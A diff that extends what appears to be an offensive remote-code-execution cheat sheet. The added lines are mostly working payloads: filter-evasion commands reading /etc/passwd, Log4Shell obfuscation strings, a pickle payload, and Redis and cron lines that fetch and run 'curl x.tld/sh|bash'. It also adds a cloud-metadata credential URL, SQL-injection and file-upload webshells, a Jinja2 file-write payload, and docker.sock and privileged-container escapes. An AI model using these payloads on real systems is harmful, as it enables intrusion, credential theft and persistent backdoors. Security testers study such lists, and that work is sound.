@@ -90,11 +90,14 @@ Encoded: `;(id;hostname)|base64`.
 - Use `sh -c` or `cmd /c` wrappers to reach the shell.
 
 **Evasion**:
-- Whitespace / IFS: `${IFS}`, `$'\t'`, `<`.
-- Token splitting: `w'h'o'a'm'i`, `w"h"o"a"m"i`.
+- Whitespace / IFS: `${IFS}`, `$'\t'`, `<`, `{cat,/etc/passwd}`.
+- Token splitting: `w'h'o'a'm'i`, `w"h"o"a"m"i`, `c\at`, `wh\<NL>oami`.
 - Variable building: `a=i;b=d; $a$b`.
 - Base64 stagers: `echo payload | base64 -d | sh`.
+- Wildcard glob: `/???/??t /???/??ss??` (cat /etc/passwd) when alphanum is filtered.
+- Hex / Unicode encoding: `\x77\x68\x6f\x61\x6d\x69`, `whoami`.
 - PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`.
+- Windows OAST staging: `certutil -urlcache -split -f http://x.tld/beacon`.
 
 ### Template injection
 
@@ -113,19 +116,30 @@ EJS:       <%= global.process.mainModule.require('child_process').execSync('id')
 
 **Java**:
 - Gadget chains via CommonsCollections / BeanUtils / Spring.
-- Tools: ysoserial.
+- Tools: ysoserial. Try chains in order: `CommonsCollections6`,
+  `CommonsCollections1`, `CommonsCollections7`, `Spring1`, `Spring2`,
+  `Hibernate1`, `Jdk7u21` (no library deps).
 - JNDI / LDAP chains (Log4Shell-style) when lookups are reachable.
+- Log4Shell obfuscation: `${${lower:j}ndi:...}`,
+  `${${::-j}${::-n}${::-d}${::-i}:ldap://x.tld/a}`,
+  `${j${env:NOTHING:-n}di:...}`. Inject in `User-Agent`, `Referer`,
+  `X-Api-Version`, any logged header.
 
 **.NET**:
 - BinaryFormatter / DataContractSerializer.
 - APIs accepting untrusted ViewState without MAC.
+- ysoserial.net gadgets: `TypeConfuseDelegate`, `ObjectDataProvider`,
+  `PSObject`, `WindowsIdentity`. Pick formatter (`BinaryFormatter`,
+  `Json`, `SoapFormatter`) by sink.
 
 **PHP**:
-- `unserialize()` and PHAR metadata.
-- Autoloaded gadget chains in frameworks and plugins.
+- `unserialize()` and PHAR metadata; abuse `__wakeup`, `__destruct`,
+  `__toString` magic methods on autoloaded classes.
+- Tools: `phpggc` for framework-specific chains.
 
 **Python / Ruby**:
-- `pickle`, `yaml.load` / `unsafe_load`, Marshal.
+- `pickle` (`__reduce__` returning `(os.system, ('id',))`),
+  `yaml.load` / `unsafe_load`, Marshal.
 - Auto-deserialization in message queues / caches.
 
 **Expression Languages**:
@@ -144,8 +158,11 @@ pop graphic-context
 
 **Ghostscript** — PostScript in PDFs / PS: `%pipe%id` file operators.
 
+**ImageMagick CVE-2022-44268** — arbitrary file read via crafted PNG
+profile; exfil through `identify -verbose` output.
+
 **ExifTool** — crafted metadata invoking external tools or library
-bugs.
+bugs (CVE-2021-22204 DjVu chain).
 
 **LaTeX** — `\write18` / `--shell-escape`, `\input` piping; pandoc
 filters.
@@ -157,9 +174,54 @@ filters.
 - **FastCGI** — `gopher://` to php-fpm (build FPM records to invoke
   `system` / `exec`).
 - **Redis** — `gopher://` write cron / authorized_keys / webroot;
-  module load when allowed.
+  module load when allowed. Sequence:
+  `CONFIG SET dir /etc/cron.d/`, `CONFIG SET dbfilename root`,
+  `SET 1 "* * * * * root curl http://x.tld/sh|bash"`, `SAVE`.
+- **Cloud metadata** — `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+  for IAM creds; GCP / Azure equivalents exist.
 - **Admin interfaces** — Jenkins script console, Spark UI, Jupyter
   kernels reachable internally.
+
+### SQL injection → RCE
+
+- **MySQL**: `SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/sh.php'`;
+  UDF (`lib_mysqludf_sys.so` → `sys_exec`).
+- **PostgreSQL** (9.3+): `COPY (SELECT '') TO PROGRAM 'curl x.tld/$(id)'`;
+  large-object `lo_export` to webroot.
+- **MSSQL**: enable + invoke `xp_cmdshell`, or `sp_OACreate WScript.Shell`
+  + `sp_OAMethod ... 'Run'`.
+
+### Path traversal → RCE
+
+Overwrite executable / auto-loaded paths via writable upload or PUT:
+- `~/.ssh/authorized_keys` (key-based SSH).
+- `/etc/cron.d/<name>` (cron line: `* * * * * root curl x.tld/sh|bash`).
+- `~/.bashrc`, `/etc/profile.d/`.
+- PHP `.user.ini` with `auto_prepend_file=/tmp/sh.php`.
+- `.htaccess` adding handler to map `.jpg` → `application/x-httpd-php`.
+
+### Prototype pollution → RCE (Node.js)
+
+Pollute `Object.prototype` via JSON `__proto__` or query
+`?__proto__[x]=y`, then escalate when sink reads polluted properties:
+- `child_process` options: set `shell` and `argv0` so spawned processes
+  inherit attacker-controlled command.
+- `NODE_OPTIONS=--require /tmp/x.js` if a downstream `spawn` honors env.
+
+### File upload → RCE
+
+- **Extension bypass**: `shell.php.jpg`, `shell.php%00.jpg`,
+  `shell.pHp`, `shell.php%20`, `shell.php::$DATA` (NTFS ADS),
+  `shell.php/` (IIS), trailing dots / spaces.
+- **Polyglot**: `GIF89a<?php system($_GET[c]);?>` passes magic-byte
+  checks while remaining executable PHP.
+- **Handler hijack**: upload `.htaccess` / `web.config` to remap a
+  benign extension to a code handler; revisit a previously uploaded
+  image as code.
+- **Archive (Zip Slip)**: paths with `../` or symlinks in zip / tar to
+  drop files into webroot, cron.d, or `.ssh/`.
+- **SSTI → file write → RCE** — Jinja2:
+  `{{''.__class__.__mro__[1].__subclasses__()[<n>]('/var/www/html/sh.php','w').write('<?php system($_GET[c]);?>')}}`.
 
 ### Container and Kubernetes
 
@@ -168,8 +230,13 @@ filters.
 - Enumerate mounts and capabilities — `capsh --print`.
 - Abuses: mounted `docker.sock`, `hostPath` mounts, privileged
   containers.
+- Mounted `docker.sock`:
+  `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh`.
+- Privileged container: `mount /dev/sda1 /tmp/h && chroot /tmp/h sh`.
 - Write to `/proc/sys/kernel/core_pattern` or mount host with
   `--privileged`.
+- Kernel primitives when host is unpatched: DirtyPipe (CVE-2022-0847),
+  DirtyCred (CVE-2022-2588), Dirty COW (CVE-2016-5195).
 
 **Kubernetes**:
 - Steal service-account token from
